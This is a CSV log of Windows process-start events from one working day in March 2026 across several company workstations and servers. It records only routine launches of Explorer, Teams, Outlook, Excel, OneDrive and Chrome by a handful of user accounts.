TimeGenerated,Computer,AccountName,ProcessName,FolderPath,CommandLine,ParentProcessName
2026-03-05T07:04:00Z,WKS-LON-031,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T07:06:00Z,WKS-BLR-022,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T07:07:00Z,WKS-CHI-009,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T07:12:00Z,SRV-FILE-01,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T07:13:00Z,SRV-APP-02,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T07:17:00Z,SRV-FILE-01,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T07:19:00Z,WKS-CHI-009,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T07:21:00Z,WKS-BLR-022,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T07:23:00Z,SRV-APP-02,m.owusu,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T07:29:00Z,SRV-APP-02,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T07:33:00Z,WKS-CHI-009,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T07:36:00Z,SRV-APP-02,j.patel,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T07:38:00Z,WKS-CHI-009,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T07:42:00Z,SRV-APP-02,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T07:46:00Z,WKS-BLR-014,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T07:48:00Z,SRV-FILE-01,s.nguyen,onedrive.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T07:52:00Z,SRV-APP-02,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T07:58:00Z,WKS-BLR-022,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T07:59:00Z,WKS-BLR-022,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T08:03:00Z,WKS-BLR-014,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T08:04:00Z,WKS-BLR-022,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T08:05:00Z,WKS-LON-031,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T08:10:00Z,WKS-LON-031,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T08:16:00Z,WKS-BLR-022,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T08:21:00Z,WKS-LON-031,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T08:27:00Z,WKS-LON-031,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T08:33:00Z,SRV-FILE-01,a.kowalski,onedrive.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T08:35:00Z,SRV-APP-02,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T08:36:00Z,WKS-BLR-014,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T08:38:00Z,WKS-BLR-022,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T08:40:00Z,SRV-APP-02,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T08:42:00Z,WKS-CHI-009,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T08:44:00Z,SRV-FILE-01,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T08:47:00Z,WKS-BLR-014,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T08:50:00Z,WKS-BLR-022,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T08:53:00Z,WKS-LON-031,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T08:56:00Z,SRV-APP-02,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T08:57:00Z,WKS-CHI-009,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T09:01:00Z,WKS-BLR-022,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T09:03:00Z,SRV-FILE-01,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T09:04:00Z,SRV-FILE-01,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T09:06:00Z,SRV-FILE-01,r.singh,onedrive.exe,C:\Users\r.singh\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T09:08:00Z,WKS-LON-031,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T09:09:00Z,WKS-LON-031,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T09:10:00Z,SRV-APP-02,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T09:13:00Z,WKS-LON-031,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T09:16:00Z,WKS-LON-031,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T09:22:00Z,SRV-APP-02,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T09:26:00Z,SRV-FILE-01,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T09:31:00Z,SRV-FILE-01,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T09:33:00Z,WKS-LON-031,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T09:36:00Z,WKS-BLR-014,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T09:42:00Z,WKS-CHI-009,s.nguyen,onedrive.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T09:48:00Z,WKS-BLR-022,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T09:54:00Z,WKS-LON-031,r.singh,onedrive.exe,C:\Users\r.singh\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T09:56:00Z,WKS-LON-031,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T10:00:00Z,WKS-BLR-014,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T10:05:00Z,WKS-BLR-022,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T10:08:00Z,SRV-FILE-01,r.singh,teams.exe,C:\Users\r.singh\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T10:13:00Z,WKS-LON-031,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T10:19:00Z,SRV-FILE-01,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T10:24:00Z,SRV-APP-02,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T10:30:00Z,SRV-APP-02,m.owusu,teams.exe,C:\Users\m.owusu\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T10:36:00Z,WKS-BLR-014,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T10:37:00Z,SRV-APP-02,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T10:41:00Z,WKS-CHI-009,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T10:47:00Z,SRV-FILE-01,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T10:50:00Z,WKS-BLR-022,j.patel,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T10:54:00Z,WKS-BLR-022,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T10:57:00Z,WKS-BLR-022,s.nguyen,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T11:03:00Z,SRV-FILE-01,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T11:08:00Z,SRV-FILE-01,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T11:11:00Z,WKS-BLR-022,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T11:16:00Z,SRV-FILE-01,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T11:20:00Z,SRV-APP-02,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T11:26:00Z,WKS-BLR-022,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T11:28:00Z,WKS-LON-031,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T11:29:00Z,WKS-CHI-009,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T11:32:00Z,SRV-FILE-01,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T11:37:00Z,SRV-FILE-01,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T11:43:00Z,WKS-BLR-014,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T11:47:00Z,WKS-CHI-009,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T11:52:00Z,WKS-BLR-014,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T11:53:00Z,WKS-CHI-009,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T11:58:00Z,WKS-CHI-009,s.nguyen,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T11:59:00Z,SRV-FILE-01,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T12:01:00Z,WKS-BLR-014,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T12:04:00Z,WKS-CHI-009,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T12:05:00Z,SRV-APP-02,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T12:07:00Z,SRV-FILE-01,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T12:12:00Z,WKS-BLR-014,r.singh,onedrive.exe,C:\Users\r.singh\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T12:13:00Z,SRV-FILE-01,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T12:15:00Z,SRV-APP-02,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T12:20:00Z,SRV-FILE-01,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T12:23:00Z,SRV-FILE-01,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T12:28:00Z,SRV-APP-02,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T12:29:00Z,WKS-CHI-009,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T12:31:00Z,WKS-CHI-009,s.nguyen,onedrive.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T12:32:00Z,WKS-BLR-022,l.garcia,onedrive.exe,C:\Users\l.garcia\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T12:37:00Z,SRV-FILE-01,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T12:41:00Z,SRV-FILE-01,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T12:46:00Z,WKS-LON-031,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T12:47:00Z,WKS-BLR-022,s.nguyen,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T12:50:00Z,WKS-CHI-009,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T12:51:00Z,SRV-APP-02,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T12:54:00Z,WKS-BLR-022,s.nguyen,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T12:57:00Z,SRV-APP-02,m.owusu,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T12:58:00Z,WKS-LON-031,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T12:59:00Z,WKS-CHI-009,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T13:05:00Z,WKS-CHI-009,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T13:08:00Z,WKS-BLR-014,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T13:13:00Z,WKS-BLR-022,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T13:19:00Z,SRV-FILE-01,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T13:25:00Z,WKS-LON-031,l.garcia,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T13:31:00Z,WKS-BLR-022,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T13:35:00Z,WKS-BLR-014,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T13:41:00Z,WKS-CHI-009,s.nguyen,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T13:42:00Z,WKS-LON-031,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T13:43:00Z,WKS-BLR-022,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T13:49:00Z,WKS-CHI-009,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T13:51:00Z,SRV-APP-02,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T13:52:00Z,SRV-FILE-01,j.patel,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T13:56:00Z,WKS-LON-031,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T14:01:00Z,WKS-BLR-022,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T14:03:00Z,WKS-LON-031,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T14:06:00Z,SRV-APP-02,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T14:12:00Z,SRV-APP-02,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T14:18:00Z,WKS-BLR-014,l.garcia,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T14:20:00Z,WKS-BLR-022,s.nguyen,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T14:26:00Z,WKS-BLR-022,s.nguyen,onedrive.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T14:29:00Z,WKS-BLR-022,r.singh,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T14:35:00Z,SRV-APP-02,a.kowalski,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T14:37:00Z,WKS-BLR-022,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T14:43:00Z,SRV-FILE-01,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T14:48:00Z,SRV-APP-02,j.patel,teams.exe,C:\Users\j.patel\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T14:51:00Z,WKS-CHI-009,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T14:55:00Z,WKS-BLR-022,j.patel,onedrive.exe,C:\Users\j.patel\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T14:56:00Z,WKS-BLR-014,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T14:59:00Z,WKS-BLR-022,j.patel,onedrive.exe,C:\Users\j.patel\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T15:02:00Z,WKS-BLR-022,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T15:05:00Z,WKS-BLR-014,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T15:08:00Z,WKS-BLR-022,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T15:09:00Z,WKS-BLR-022,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T15:11:00Z,SRV-FILE-01,m.owusu,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T15:14:00Z,WKS-BLR-022,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T15:15:00Z,WKS-CHI-009,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T15:20:00Z,WKS-BLR-014,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T15:23:00Z,WKS-CHI-009,l.garcia,teams.exe,C:\Users\l.garcia\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T15:28:00Z,WKS-BLR-022,j.patel,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T15:29:00Z,WKS-BLR-022,s.nguyen,teams.exe,C:\Users\s.nguyen\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T15:32:00Z,SRV-APP-02,m.owusu,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T15:38:00Z,WKS-BLR-014,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T15:44:00Z,WKS-LON-031,j.patel,onedrive.exe,C:\Users\j.patel\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T15:50:00Z,WKS-CHI-009,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T15:55:00Z,WKS-LON-031,a.kowalski,onedrive.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T15:58:00Z,WKS-CHI-009,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T15:59:00Z,WKS-CHI-009,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T16:00:00Z,WKS-BLR-014,s.nguyen,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T16:03:00Z,SRV-APP-02,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T16:06:00Z,SRV-APP-02,a.kowalski,teams.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\Teams\current\Teams.exe,teams.exe,explorer.exe
2026-03-05T16:08:00Z,WKS-LON-031,r.singh,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T16:13:00Z,WKS-BLR-014,a.kowalski,onedrive.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T16:16:00Z,WKS-BLR-014,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T16:22:00Z,WKS-BLR-014,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T16:28:00Z,WKS-LON-031,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T16:33:00Z,WKS-BLR-022,a.kowalski,onedrive.exe,C:\Users\a.kowalski\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T16:38:00Z,WKS-BLR-014,m.owusu,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T16:40:00Z,WKS-BLR-014,a.kowalski,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T16:44:00Z,SRV-FILE-01,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T16:49:00Z,WKS-BLR-014,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T16:50:00Z,SRV-APP-02,j.patel,onedrive.exe,C:\Users\j.patel\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T16:52:00Z,WKS-LON-031,s.nguyen,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T16:58:00Z,SRV-FILE-01,a.kowalski,explorer.exe,C:\Windows\explorer.exe,explorer.exe,explorer.exe
2026-03-05T16:59:00Z,WKS-BLR-014,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T17:01:00Z,WKS-BLR-022,r.singh,onedrive.exe,C:\Users\r.singh\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T17:02:00Z,WKS-BLR-014,l.garcia,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T17:04:00Z,WKS-BLR-022,r.singh,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T17:06:00Z,SRV-FILE-01,l.garcia,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
2026-03-05T17:09:00Z,WKS-BLR-022,l.garcia,excel.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,excel.exe,explorer.exe
2026-03-05T17:15:00Z,WKS-BLR-014,j.patel,chrome.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,explorer.exe
2026-03-05T17:20:00Z,WKS-CHI-009,m.owusu,onedrive.exe,C:\Users\m.owusu\AppData\Local\Microsoft\OneDrive\OneDrive.exe,onedrive.exe,explorer.exe
2026-03-05T17:22:00Z,WKS-CHI-009,r.singh,outlook.exe,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,outlook.exe,explorer.exe
